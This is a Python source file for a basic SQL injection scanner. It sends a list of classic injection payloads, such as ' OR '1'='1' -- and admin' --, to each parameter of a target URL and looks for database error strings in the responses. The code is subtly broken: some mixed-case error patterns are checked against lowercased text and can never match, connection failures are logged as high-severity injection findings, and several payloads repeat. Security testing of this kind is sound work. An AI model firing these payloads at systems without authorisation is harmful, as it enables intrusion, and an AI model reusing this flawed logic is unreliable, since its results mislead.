import requests

# List of SQL Injection payloads based on OWASP guidelines
SQL_PAYLOADS = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR 1=1 --",
    "' OR '1'='1' /*",
    "' OR 1=1#",
    "' OR 1=1/*",
    "' OR 'x'='x",
    "' OR ''='",
    "' OR '1'='1' -- -",
    "' OR '1'='1' ({",
    "' OR 1=1;",
    "' OR 1=1 --",
    "' OR 1=1#",
    "admin' --",
    "admin' #",
    "admin'/*",
    "' OR 1=1 --",
    "OR 1=1",
    "' OR ''='"
]

# List of expected SQL error messages to identify potential vulnerabilities
EXPECTED_SQL_ERRORS = [
    "syntax error",
    "you have an error in your sql syntax",
    "unclosed quotation mark after the character string",
    "quoted string not properly terminated",
    "mysql_fetch_array()",
    "SQL syntax",
    "Warning: mysql_fetch_assoc()",
    "Warning: mysql_fetch_array()",
    "Warning: mysql_num_rows()"
]

def scan_sql_injection(url, params, payloads=SQL_PAYLOADS, expected_errors=EXPECTED_SQL_ERRORS):
    vulnerabilities = []

    for param in params:
        for payload in payloads:
            # Prepare test parameters by injecting the payload into the current parameter
            test_params = {key: (payload if key == param else value) for key, value in params.items()}
            try:
                response = requests.get(url, params=test_params)
                if any(error in response.text.lower() for error in expected_errors):
                    # Append vulnerability details in the required format with params in description
                    vulnerabilities.append({
                        "issue": "SQL Injection",
                        "description": (
                            f"SQL Injection vulnerability detected using payload: '{payload}' on parameter: '{param}'.\n"
                            f"Parameters used: {test_params}\n"
                            f"Response snippet: {response.text[:200]}..."
                        ),
                        "severity": "High",
                        "endpoint": url,
                        "payload": payload
                    })
            except Exception as e:
                # Handle any exceptions such as connection errors
                vulnerabilities.append({
                    "issue": "SQL Injection",
                    "description": (
                        f"Error testing SQL injection using payload: '{payload}' on parameter: '{param}'.\n"
                        f"Parameters used: {test_params}\n"
                        f"Error: {str(e)}"
                    ),
                    "severity": "High",
                    "endpoint": url,
                    "payload": payload
                })

    return vulnerabilities
